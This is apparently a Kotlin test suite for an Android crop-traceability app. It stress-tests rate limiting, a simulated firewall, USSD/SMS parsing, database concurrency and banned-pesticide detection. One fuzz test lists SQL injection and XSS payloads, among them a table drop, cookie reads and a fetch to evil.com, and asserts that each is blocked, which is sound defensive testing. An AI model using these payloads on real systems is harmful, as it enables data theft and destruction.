package com.example

import android.content.Context
import androidx.room.Room
import androidx.test.core.app.ApplicationProvider
import com.example.data.gateway.SmsEngine
import com.example.data.gateway.UssdEngine
import com.example.data.gateway.UssdRequest
import com.example.data.gateway.UssdResponseType
import com.example.data.local.AppDatabase
import com.example.data.local.entity.FarmerEntity
import com.example.data.local.entity.HarvestBatchEntity
import com.example.data.repository.TraceHarvestRepository
import com.example.data.security.ExporterRole
import com.example.data.security.SecurityActionOutcome
import com.example.data.security.SecurityEngine
import com.example.data.security.SecurityLayer
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.runBlocking
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import java.util.UUID
import java.util.concurrent.atomic.AtomicInteger

/**
 * TraceHarvest Comprehensive Stress & Resilience Test Suite
 *
 * Strains, fuzzes, and stress-tests:
 * 1. Security Engine & WAF (Brute-force rate limiting, SQLi/XSS attack vectors, schema tampering)
 * 2. USSD Gateway (Concurrent sessions, malformed inputs, nested navigation stress)
 * 3. SMS Gateway (High volume inbound messages, dialect variants, unknown commands)
 * 4. Room Database & Repository (Concurrent writes, boundary values, zero/extreme metrics)
 * 5. MRL & SPS Quarantine Engine (Case-insensitive banned chemical evasion detection)
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [36])
class AppStressTest {

    private lateinit var database: AppDatabase
    private lateinit var repository: TraceHarvestRepository
    private lateinit var securityEngine: SecurityEngine
    private lateinit var ussdEngine: UssdEngine
    private lateinit var smsEngine: SmsEngine

    @Before
    fun setUp() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        database = Room.inMemoryDatabaseBuilder(context, AppDatabase::class.java)
            .allowMainThreadQueries()
            .build()
        repository = TraceHarvestRepository(database.traceHarvestDao())
        securityEngine = SecurityEngine()
        ussdEngine = UssdEngine()
        smsEngine = SmsEngine()
    }

    @After
    fun tearDown() {
        database.close()
    }

    // =========================================================================
    // 1. SECURITY & WAF BRUTE-FORCE & STRAIN TESTING
    // =========================================================================

    @Test
    fun `stress test rate limiter by brute-forcing 1000 requests against exporter endpoint`() {
        val jwt = securityEngine.generateJwt(
            ExporterRole.CERTIFIED_EXPORTER,
            "Olam Agri Nigeria",
            "usr_olam_stress_01"
        )

        val allowedCount = AtomicInteger(0)
        val blockedCount = AtomicInteger(0)

        // Reset rate limiter to 300 RPM
        securityEngine.resetRateLimitTokens()

        // Brute force 1000 requests in rapid succession
        for (i in 1..1000) {
            val event = securityEngine.simulateRequest(
                endpoint = "/api/v1/export/batches/query",
                method = "GET",
                clientIp = "102.89.44.${i % 250}",
                clientIdentity = "Exporter Terminal #$i",
                jwtToken = jwt
            )

            if (event.outcome == SecurityActionOutcome.ALLOWED_200) {
                allowedCount.incrementAndGet()
            } else if (event.outcome == SecurityActionOutcome.BLOCKED_429_RATE_LIMITED) {
                blockedCount.incrementAndGet()
            }
        }

        // Exactly 300 requests should be permitted within the rate limit window; remainder 700 must be blocked with 429
        assertEquals(300, allowedCount.get())
        assertEquals(700, blockedCount.get())
        assertEquals(0, securityEngine.getRemainingTokens())
    }

    @Test
    fun `fuzz test guardian waf with aggressive sql and xss injection attack vectors`() {
        val attackVectors = listOf(
            // SQL Injection payloads
            "batch_id=' UNION SELECT * FROM users--",
            "batch_id=1' OR 1=1--",
            "batch_id=1; DROP TABLE harvest_batches;--",
            "farmer_code=TH' UNION SELECT password FROM admin--",
            "export_query=';--",
            // XSS vectors
            "notes=<script>alert('xss')</script>",
            "notes=<SCRIPT>document.cookie</SCRIPT>",
            "param=javascript:stealTokens()",
            "img=<img src=x onerror=alert(1)>",
            "payload=<svg/onload=fetch('//evil.com')>"
        )

        val jwt = securityEngine.generateJwt(
            ExporterRole.EU_INSPECTOR,
            "NVWA Netherlands",
            "usr_inspector_waf"
        )

        for (payload in attackVectors) {
            val event = securityEngine.simulateRequest(
                endpoint = "/api/v1/export/query?input=" + payload.replace(" ", "%20"),
                method = "POST",
                clientIp = "185.220.101.42",
                clientIdentity = "Malicious Exploit Tester",
                jwtToken = jwt,
                payload = payload
            )

            assertEquals(
                "Payload should have been intercepted: $payload",
                SecurityActionOutcome.BLOCKED_403_FORBIDDEN_INJECTION,
                event.outcome
            )
            assertEquals(403, event.httpStatus)
            assertEquals(SecurityLayer.GUARDIAN_WAF, event.layer)
        }
    }

    @Test
    fun `fuzz test wallarm openapi schema validator with invalid and tampered payloads`() {
        val invalidPayloads = listOf(
            // Negative moisture level (violates min: 0.0)
            "{\"batchCode\":\"NG-SES-2026-0042\",\"moisture_percent\":-15.0}",
            // Unauthorized MRL override attempt
            "{\"batchCode\":\"NG-SES-2026-0042\",\"mrl_override\":true,\"approved_by\":\"root\"}",
            // Tamper hash injection
            "{\"batchCode\":\"NG-SES-2026-0042\",\"tamper_hash\":\"0x000000000\"}"
        )

        val jwt = securityEngine.generateJwt(
            ExporterRole.CERTIFIED_EXPORTER,
            "Valency Agro",
            "usr_valency"
        )

        for (payload in invalidPayloads) {
            val event = securityEngine.simulateRequest(
                endpoint = "/api/v1/inspections/mrl-signoff",
                method = "POST",
                clientIp = "102.89.34.120",
                clientIdentity = "Tampered Client Terminal",
                jwtToken = jwt,
                payload = payload
            )

            assertEquals(
                "Wallarm API Firewall should block invalid schema payload: $payload",
                SecurityActionOutcome.BLOCKED_400_SCHEMA_VIOLATION,
                event.outcome
            )
            assertEquals(400, event.httpStatus)
            assertEquals(SecurityLayer.WALLARM_FIREWALL, event.layer)
        }
    }

    // =========================================================================
    // 2. USSD GATEWAY PROTOCOL & NAVIGATION STRESS TESTING
    // =========================================================================

    @Test
    fun `stress test ussd engine with 500 concurrent sessions and random navigation hops`() {
        runBlocking {
        val sampleFarmer = FarmerEntity(
            id = 1,
            farmerCode = "TH-KAN-2026-1048",
            fullName = "Audu Abubakar",
            phoneNumber = "+2348031234567",
            state = "Kano",
            lga = "Dambatta",
            community = "Gwarabjawa",
            crop = "Sesame",
            farmSizeHectares = 2.5,
            latitude = 12.4382,
            longitude = 8.5147,
            cooperative = "Dambatta Sesame Growers",
            registrationTimestamp = System.currentTimeMillis()
        )

        val sampleBatch = HarvestBatchEntity(
            id = 1,
            batchCode = "NG-SES-2026-0042-EXP",
            crop = "Sesame",
            farmerCode = "TH-KAN-2026-1048",
            farmerName = "Audu Abubakar",
            region = "Kano (Dambatta)",
            harvestDate = System.currentTimeMillis(),
            bagCount = 30,
            netWeightKg = 1500.0,
            moisturePercent = 7.4,
            foreignMatterPercent = 1.2,
            grade = "Grade A Export Ready",
            mrlStatus = "PASSED_SPS",
            aflatoxinStatus = "SAFE (<4 ppb)",
            phiDaysObserved = 24,
            destinationMarket = "EU & United Kingdom",
            blockchainHash = "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90",
            blockchainTxId = "0xa1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4",
            isBlockchainAnchored = true,
            isFlaggedForRejection = false,
            rejectionReason = null,
            qrPayload = "TRACEHARVEST://BATCH/NG-SES-2026-0042-EXP"
        )

        val farmers = listOf(sampleFarmer)
        val batches = listOf(sampleBatch)

        val testInputs = listOf(
            "",           // Root menu
            "1",          // Menu 1: Log practice input
            "1*1",        // Menu 1 -> Sub-option 1 (Lambda-Super)
            "1*2",        // Menu 1 -> Sub-option 2 (BioNeem)
            "1*3",        // Menu 1 -> Sub-option 3 (PICS Bags)
            "2",          // Menu 2: Check batch clearance
            "3",          // Menu 3: Farmer ID & Geotag
            "4",          // Menu 4: Export Price Premium
            "5",          // Menu 5: Report Banned Sniper Spray
            "99",         // Invalid root option
            "1*99",       // Invalid sub-option
            "abc",        // Non-numeric garbage
            "*#*#*#",     // Special characters
            "1*1*1*1*1"   // Over-nested navigation
        )

        // Launch 500 concurrent USSD requests using coroutines
        val jobs = (1..500).map { i ->
            async(Dispatchers.Default) {
                val input = testInputs[i % testInputs.size]
                val request = UssdRequest(
                    sessionId = "SESSION_BURST_$i",
                    serviceCode = "*384*748#",
                    phoneNumber = "+234803" + (1000000 + i),
                    text = input
                )
                val response = ussdEngine.processRequest(request, farmers, batches)
                assertNotNull("Response message cannot be null", response.message)
                assertTrue("Response must start with CON or END", response.message.startsWith("CON ") || response.message.startsWith("END "))
                if (response.responseType == UssdResponseType.CON) {
                    assertTrue(response.message.startsWith("CON "))
                } else {
                    assertTrue(response.message.startsWith("END "))
                }
            }
        }

        jobs.awaitAll()
        }
    }

    // =========================================================================
    // 3. TWO-WAY SMS PARSER STRESS TESTING
    // =========================================================================

    @Test
    fun `stress test sms engine with 1000 inbound messages and multilingual dialect inputs`() {
        val testMessages = listOf(
            "1",
            "CONFIRM",
            "confirm",
            "EEY",
            "eey",
            "YES",
            "yes",
            "2",
            "DISPUTE",
            "dispute",
            "AA",
            "aa",
            "NO",
            "no",
            "STATUS",
            "status",
            "REPORT SNIPER",
            "report sniper on my neighbor farm",
            "HELP",
            "help",
            "Barka da yamma",
            "Hello who is this",
            "1234567890",
            "????",
            "🔥🚨🌾",
            "   CONFIRM   ", // Extra padding
            "1 (CONFIRM)"   // Formatted option
        )

        for (i in 1..1000) {
            val msg = testMessages[i % testMessages.size]
            val result = smsEngine.processInboundMessage(
                fromPhone = "+234803" + (2000000 + i),
                messageText = msg,
                farmers = emptyList(),
                batches = emptyList()
            )

            assertNotNull(result.automatedResponse)
            assertTrue("Automated response must have content", result.automatedResponse.isNotBlank())
            assertNotNull(result.actionTaken)
        }
    }

    // =========================================================================
    // 4. ROOM DATABASE CONCURRENCY & BOUNDARY VALUE STRAIN TESTING
    // =========================================================================

    @Test
    fun `stress test room repository with concurrent bulk insertions`() {
        runBlocking {
            val initialFarmerCount = repository.farmerCount.first()
            assertEquals(0, initialFarmerCount)

            // Concurrently insert 50 farmers across multiple threads
            val farmerJobs = (1..50).map { i ->
                async(Dispatchers.IO) {
                    repository.registerFarmer(
                        fullName = "Stress Farmer #$i",
                        phoneNumber = "+234803" + (5000000 + i),
                        state = if (i % 2 == 0) "Kano" else "Jigawa",
                        lga = "LGA_$i",
                        community = "Community_$i",
                        crop = if (i % 3 == 0) "Sesame" else if (i % 3 == 1) "Ginger" else "Soybeans",
                        farmSizeHectares = 1.0 + (i % 10) * 0.5,
                        latitude = 12.0 + (i * 0.01),
                        longitude = 8.0 + (i * 0.01),
                        cooperative = "Coop_$i"
                    )
                }
            }
            val farmers = farmerJobs.awaitAll()
            assertEquals(50, farmers.size)

            val totalRegistered = repository.farmerCount.first()
            assertEquals(50, totalRegistered)

            // Concurrently insert 100 harvest batches linked to these farmers
            val batchJobs = (1..100).map { i ->
                async(Dispatchers.IO) {
                    val assignedFarmer = farmers[i % farmers.size]
                    repository.createHarvestBatch(
                        farmerCode = assignedFarmer.farmerCode,
                        farmerName = assignedFarmer.fullName,
                        crop = assignedFarmer.crop,
                        region = "${assignedFarmer.state} (${assignedFarmer.lga})",
                        bagCount = 10 + (i % 50),
                        netWeightKg = 500.0 + (i * 25.0),
                        moisturePercent = 6.0 + (i % 8) * 0.8,
                        foreignMatterPercent = 1.0 + (i % 3) * 0.5,
                        destinationMarket = "EU & United Kingdom"
                    )
                }
            }
            val batches = batchJobs.awaitAll()
            assertEquals(100, batches.size)

            val totalBatches = repository.totalBatchesCount.first()
            assertEquals(100, totalBatches)
        }
    }

    @Test
    fun `test extreme boundary values in harvest batch aggregation`() {
        runBlocking {
            // Zero bags and micro-weight (edge case)
            val minBatch = repository.createHarvestBatch(
                farmerCode = "TH-KAN-2026-9999",
                farmerName = "Micro Farmer",
                crop = "Sesame",
                region = "Kano",
                bagCount = 0,
                netWeightKg = 0.5,
                moisturePercent = 0.0,
                foreignMatterPercent = 0.0
            )
            assertNotNull(minBatch)
            assertEquals(0, minBatch.bagCount)
            assertEquals(0.5, minBatch.netWeightKg, 0.001)
            assertEquals("Grade A Export Ready", minBatch.grade) // 0% moisture is clean

            // High moisture aflatoxin violation (18.5% moisture)
            val wetBatch = repository.createHarvestBatch(
                farmerCode = "TH-JIG-2026-8888",
                farmerName = "High Moisture Farmer",
                crop = "Soybeans",
                region = "Jigawa",
                bagCount = 500,
                netWeightKg = 25000.0,
                moisturePercent = 18.5,
                foreignMatterPercent = 4.2
            )
            assertTrue("Batch with 18.5% moisture must be flagged", wetBatch.isFlaggedForRejection)
            assertEquals("UNSAFE (>10 ppb)", wetBatch.aflatoxinStatus)
            assertEquals("Non-Compliant High Risk", wetBatch.grade)
            assertTrue(wetBatch.rejectionReason?.contains("Aflatoxin Hazard") == true)
        }
    }

    // =========================================================================
    // 5. MRL DETECTION & QUARANTINE EVASION RESILIENCE
    // =========================================================================

    @Test
    fun `strain mrl detection engine to ensure banned sniper chemicals cannot evade filter`() {
        runBlocking {
            val bannedEvasionVariants = listOf(
                "Sniper 1000EC",
                "SNIPER",
                "sniper",
                "Dichlorvos DDVP",
                "ddvp",
                "DICHLORVOS 50%",
                "Chlorpyrifos-ethyl",
                "CHLORPYRIFOS",
                "Monocrotophos Azodrin"
            )

            for (variant in bannedEvasionVariants) {
                val log = repository.logPractice(
                    farmerCode = "TH-EVASION-TEST",
                    farmerName = "Evasion Tester",
                    crop = "Sesame",
                    category = "Pesticide",
                    productName = variant,
                    activeIngredient = variant,
                    dosage = "20ml / 15L water",
                    phiDays = 30
                )

                assertEquals(
                    "Chemical variant '$variant' must be flagged as BANNED_MRL_VIOLATION",
                    "BANNED_MRL_VIOLATION",
                    log.riskLevel
                )
                assertTrue(
                    "Risk notes must explain regulatory ban",
                    log.riskNotes.contains("BANNED") || log.riskNotes.contains("CRITICAL VIOLATION")
                )
            }

            // Verify that subsequent batch creation for this farmer is automatically blocked
            val batch = repository.createHarvestBatch(
                farmerCode = "TH-EVASION-TEST",
                farmerName = "Evasion Tester",
                crop = "Sesame",
                region = "Kano",
                bagCount = 50,
                netWeightKg = 2500.0,
                moisturePercent = 7.0,
                foreignMatterPercent = 1.0
            )

            assertTrue("Batch must be flagged due to prior banned chemical log", batch.isFlaggedForRejection)
            assertEquals("VIOLATION_BLOCKED", batch.mrlStatus)
            assertFalse("Flagged batch must NOT be automatically anchored", batch.isBlockchainAnchored)
        }
    }
}
